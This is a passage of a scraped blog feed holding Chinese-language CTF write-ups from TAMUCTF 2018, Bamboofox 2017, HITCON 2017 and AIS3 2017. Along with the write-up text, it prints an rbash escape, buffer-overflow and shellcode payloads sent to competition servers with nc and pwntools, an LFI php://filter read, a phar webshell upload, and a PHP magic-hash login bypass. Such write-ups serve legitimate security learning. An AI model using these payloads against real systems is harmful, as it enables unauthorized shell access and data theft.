滿滿的水題有點無言\n只寫一些值得紀錄的\n\n<!-- more -->\n\n## Misc\n### you can run, you can hide [25]\n\n```\nfind the hidden flag.\n\nssh tamuctf@shell1.ctf.tamu.edu -p 2223\npassword: tamuctf\n```\n\nssh 進去之後發現他是用`rbash`，意外在網路上找到神奇 payload (到現在還不知道原理)\n`BASH_CMDS[a]=/bin/sh;a`\n[Source](https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html)\n\n目錄裡面直接就有flag了\n`gigem{TAMU_secret_society_qSD358OUYGcezTlFbqeh}`\n\n後面神隊友給了另一個 payload (在看連入的連線的時候發現好像大部分都是這樣連入的)\n`ssh tamuctf@shell1.ctf.tamu.edu -p 2223 -t \"bash --noprofile\"`\n\n### enum [150]\n\n```\nFind the hidden flag.\nYou do not need to bruteforce. Don't do it.\n\nssh tamuctf@shell2.ctf.tamu.edu -p 2222\npassword: tamuctf\n```\n\n這題卡很久，最後靠隊友 carry\n連續前面一題，繞過之後我一開始在`/var/backups/`找到`.srv.bak`，裡面放了帳號跟密碼\n後來就是隊友carry的部分了\n用`ps aux`指令發現有一個程序是執行`/bin/bash -c /usr/sbin/service ssh restart && cd /.administrators && /usr/bin/python /.administrators/pyserver.py 9000`\n後來在自己的電腦執行`ssh -L 1234:localhost:9000 tamuctf@shell2.ctf.tamu.edu -p 2222`(port forwarding)，在自己的瀏覽器開啟`localhost:1234`再輸入之前找到的帳號密碼就可以得到 flag  了\n`gigem{pivot_piv0t_P1V0T_20975430987aff92qf89qf}`\n\n## Pwn\n### Pwn1\n只是覆蓋`cmp DWORD PTR [ebp-0xc],0xf007ba11`而已\n\nPayload:\n```bash\npython -c \"print 'a'*23 + '\\x11\\xba\\x07\\xf0'\" | nc pwn.ctf.tamu.edu 4321\n```\n\n### Pwn2\n執行`echo`函式時，可以 Overflow 跳到`print_flag`\n\nPayload:\n```bash\npython -c \"print 'a'*243 + '\\x4b\\x85\\x04\\x08'\" | nc pwn.ctf.tamu.edu 4322\n```\n\n### Pwn3\n觀察了一下會發現輸出的 random number 會是 buffer 的起始地址，所以方向就很清楚了 `return to shellcode`\n\nPayload:\n```python\n#!/usr/bin/env python\n\nfrom pwn import *\n\n#r = process('./pwn3')\n#r = remote('0.0.0.0', 8888)\nr = remote('pwn.ctf.tamu.edu', 4323)\ncontext.log_level = 'debug'\ncontext.arch = 'i386'\n\nr.recvuntil('Your random number ')\naddr = int(r.recv(10).strip(), 16)\n\nshellcode = asm(shellcraft.i386.linux.sh())\n\npayload = shellcode + 'a' * (242-len(shellcode)) + p32(addr)\n\nprint hex(addr)\nprint p32(addr)\nprint payload\n\nr.recvuntil('?')\n#raw_input('########')\nr.sendline(payload)\n```\n\n### 總結\n我 pwn 跟中邪一樣，payload 我寫都不過，隊友寫都過==\n這場情境題太多了，感覺不像一般的 CTF 反而比較像政府辦的資安比賽","categories":["writeup","CTF","TAMUCTF","2018"]},{"title":"Bamboofox CTF 2017","url":"/zh-tw/2018/bamboofox-2017/","content":"\n\n\n過了好幾個月重回了 CTF 比賽，但是這次考的是我以前沒學過的 x64 再加上我完全忘記要如何解題 ，變得 pwn 只拿下一題，挺失望的 QQ\n\n<!-- more -->\n\n`這裡就不分享 FLAG 了，只會寫出解法(也沒幾題QQ`\n\n## Misc\n\n### suck-browser\n又是個 `302` 的坑，用 `curl` 就可以停止自動跳轉\n\n### suck-apple\n一個時事梗，只用 `root` 當作用戶名，不需要密碼即可有 `root` 權限\n\n## Web\n\n### suck-login\n\nDescription:\n```\nThere is a suck login page and I found the md5 hash password is 0e836584205638841937695747769655.\n\nCan you crack it?!\n```\n\n題目有提示 `hash(密碼)` 是 `0e` 開頭的，就可以聯想到是 php 會自動轉形態的問題，\n因為 php 會自動把密碼的雜湊值轉成科學記號，變成0\n所以密碼只要再找一組雜湊值一樣為0的就可以得到 FLAG\n\n### tiny-git\n看到題目，一開始就先看 `/.git/` 資料夾，發現會返回 `403 Forbidden`，\n利用 `Denny` 大大的 Sctipt [(Link)](https://github.com/denny0223/scrabble)\n可以發現檔案依舊可以下載，但是子目錄的檔案因為會返回 403\n所以沒辦法瞭解內部檔案狀況\n這時候就要科普一下 git 的儲存方式\n[對於 git 的小解釋](https://www.siteground.com/tutorials/git/directory-structure/)\n在找到 log 之後發現他直接在 commit messege 裡面寫上 FLAG\n\n## pwn (最遺憾的一個類別)\n\n### water-impossible\n在題目有給了原始碼和 binary，在原始碼看到如果 `(int token) == 6666`\n這個檢查有過，就會噴 FLAG\n(保護只有開 NX)\n\n所以利用 cyclic 確定可以蓋到 token ，並且知道 offset 是 28，所以\nPayload:\n```python\n#!/usr/bin/env python\n\nr = remote('bamboofox.cs.nctu.edu.tw', 58799)\n\npayload = 'a'*28 + 0x00001a0a\nr.recvuntil(':')\nr.sendline(payload)\nr.interactive()\n```\n\nRank: 21 (6l0ry)","categories":["writeup","CTF","bamboofox","2017"]},{"title":"HITCON2017-Bamboofox Wargame","url":"/zh-tw/2017/hitcon-2017-bamboofox/","content":"\n只解出兩題, 剩下的因為我太廢不會繞保護所以沒解QQ\n\n<!-- more -->\n\n## Forensic [100]\n### Description:\n```這張照片應該要有旗子在上面的阿，奇怪?\n聽說他被裁剪過，不過好像不是用正規的圖片編輯軟體處理的，真是的...怎麼裁剪的這麼暴力...\n拜託了，幫我把旗子找出來，不然...\n等等有人來了...快躲起來...\n( 瀏覽器上面瀏覽可能是黑的，建議載下來看喔 )\n```\n\n這題題目已經提示要改圖片高度所以在hexeditor中找到png的寬高設定 [png格式說明書](http://www.w3.org/TR/PNG/#11IHDR)\n所以把高增加到想要的高度(in HEX)\n然後再用pngcheck把CRC重新算一遍再更正就可以囉\n\n\n## Pwn [100]\n### Description:\n```\nnc bamboofox.cs.nctu.edu.tw 22001\n\nFLAG 在 /home/ctf 底下\n\n歡迎來到 PWN 的世界\n恩...這題就是 buffer overflow 的基礎簡單入門題\n有哪邊不會可以來我們在 HITCON 的攤位問問題喔\n會的人應該 1 分鐘就解完了吧?\n恩我廢話好多喔...\n總之就是想辦法拿到 FLAG 吧\n```\n主辦方很佛心地給了src\n\n這題題目很好心的給了原始碼 ~~那就不開gdb了~~\n\n這題題目是考`LIFO+BOF`\n在記憶體裡長這樣:\n```\n+----------------+\n|                |\n|                |\n|      text      |  <-- text's buffer (40byte)\n|                |\n|                |\n| -------------- |\n| to_be_overflow |  <-- to_be_overflow's pointer\n+----------------+\n```\n在程式中`to_be_overflow`必須等於`0xABCD1234`才有shell\n所以只要在text的buffer塞滿垃圾, 在把`to_be_overflow`蓋掉直接變成`0xABCD1234`就可以取得shell\n\n所以payload會長這樣:\n```python\n#!/usr/bin/env python\n\nfrom pwn import *\n\nr = remote('bamboofox.cs.nctu.edu.tw', '22001')\n\nr.sendline('A'*40 + '\\x34\\x12\\xCD\\xAB')\n\nr.interactive()\n```\n","categories":["writeup","wargame","hitcon-2017-bamboofox"]},{"title":"AIS3 Pre-Exam 2017","url":"/zh-tw/2017/ais3-2017/","content":"\n\n\n這次是我第一次玩AIS3 Pre-Exam,難度沒有特別難<del>以web來說拉</del>.\n解題的時候有卡了一下下<del>實際上是一整天</del>\n以下是有解出來的write-up\n\n<!-- more -->\n\n`FLAG和題目大多都忘記保存了QQ,所以這篇只寫出想法和大概解法QQ`\n\n# MISC\n\n## MISC1\n只是個簽到題\n## MISC2\n<del>這題的出題者給我出來QQ, 這花了我快一天的時間QQ</del>\n題目只寫了頁面`I've sent you something :)`\n一開始看原始碼一看就看到`<!-- <img src=sudodu.png /> -->`\n一開始的只覺得應該是個Stego題\n結果不論是用`exiftool`, `binwalk`, `strings`都沒有出現任何特別的地方\n直到有一次無聊喵了一下看到header發現有傳了一串類似以base64編碼的字串\n解出來後的確是base64編碼的,結果是一個資料夾, 資料夾裡面有一張照片\n下載下來即可發現FLAG\nFLAG = `AIS3{pika}`\n\n# WEB\n## WEB1\n題目只寫了`Didn't You See The Flag?`\n用curl就會噴FLAG了\n\n## WEB2\n題目為一個登入畫面,DB已經寫死在Source Code裡了\n看了一下Source Code是\n```php\n    md5(%password) == $row['password']\n```\n後來Google了一下,發現是PHP`==`的一些問題\n([Source](http://momomoxiaoxi.com/2016/07/07/CTFWeb/#2-md5碰撞))\n([CTF實例](http://www.nobbd.de/blog/artikel.php?titel=write-up-Internetwache-CTF-2016---All-5-web-challenges))\n並且在DB找到了MD5編碼開頭為0e的密碼\n所以以0e編碼的明碼再加上相對應的username就可以取得flag\n## WEB3 & WEB4\n兩個是同一個網站\n\n### WEB3(Flag1)\n看了一下發現好像有LFI的漏洞\n就開始不斷的猜flag的位置\n<del>猜了快一天</del>\n才發現就在index\n`payload => $domain/?p=php://filter/convert.base64-encode/resource=index`\n\n### WEB4(Flag2)\n看了一下index的內容\n發現Flag2的線索\n有個`uploaddddddd`的頁面\n發現可能是要上傳webshell\n但是不論怎麼試都不行過(改content-type, 雙副檔名)\n後來才知道要用phar的協定\n壓縮webshell成zip檔,改附檔名成.jpg,利用LFI+phar執行webshell\n`the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l` 這個頁面就放flag\n進去一看就可以看到Flag2\n\n# CRYPTO\n## CRYPTO 3\n程式碼:`(我不會寫php code QQ(意思有到就好))`\n```php\nh1 = $_POST[\"username\"]\nh2 = $_POST[\"password\"]\nif h1 = h2;\n    die $flag\n```\n直覺就是SHA1 Collision\n[(Source)](https://shattered.io/)\n在網路上改一下script就會噴出flag了\n```python\nimport requests\nimport urllib2\nrotimi = urllib2.urlopen(\"http://shattered.io/static/shattered-1.pdf\").read()[:500]\nletmein = urllib2.urlopen(\"http://shattered.io/static/shattered-2.pdf\").read()[:500]\npayload = {'username': rotimi, 'password': letmein}\nr = requests.post('https://quiz.ais3.org:32670', data=payload)\nprint r.text\n```\n\n# 總結\n這次AIS3的初體驗我覺得挺好玩的\n<del>雖然只有127名QQ</del>\n因為自己Reverse跟pwn的底子還不夠,所以打完web跟misc就不繼續打了\n明年希望自己能夠給力點QQ\n\n","categories":["writeup","AIS3","2017"]}]